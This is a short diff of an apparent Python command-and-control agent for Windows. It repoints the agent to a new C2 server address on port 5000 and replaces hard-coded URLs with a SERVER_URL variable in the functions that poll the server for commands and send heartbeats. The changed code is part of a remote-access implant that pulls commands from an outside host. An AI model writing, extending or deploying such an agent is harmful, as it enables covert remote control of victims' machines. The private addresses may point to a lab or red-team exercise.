@@ -10,7 +10,7 @@ import win32com.client
 import os
 
 # URL of the C2 server
-SERVER_URL = "http://192.168.31.132:5000"
+SERVER_URL = "http://192.168.30.20:5000"
 
 # Generate a unique agent ID
 AGENT_ID = str(uuid.uuid4())
@@ -243,7 +243,7 @@ def store_command_output(agent_id, command, output):
 def check_for_commands(agent_id):
     """Check for new commands from the server."""
     try:
-        response = requests.get(f"http://192.168.31.132:5000/get_command/{agent_id}")
+        response = requests.get(f"{SERVER_URL}/get_command/{agent_id}")
         if response.status_code == 200:
             command_data = response.json()
             command = command_data.get("command")
@@ -263,7 +263,7 @@ def check_for_commands(agent_id):
 def send_heartbeat(agent_id):
     """Send heartbeat to the server."""
     try:
-        response = requests.post("http://192.168.31.132:5000/heartbeat", json={"agent_id": agent_id})
+        response = requests.post(f"{SERVER_URL}/heartbeat", json={"agent_id": agent_id})
         if response.status_code == 200:
             print("Heartbeat sent.")
     except requests.exceptions.RequestException as e:
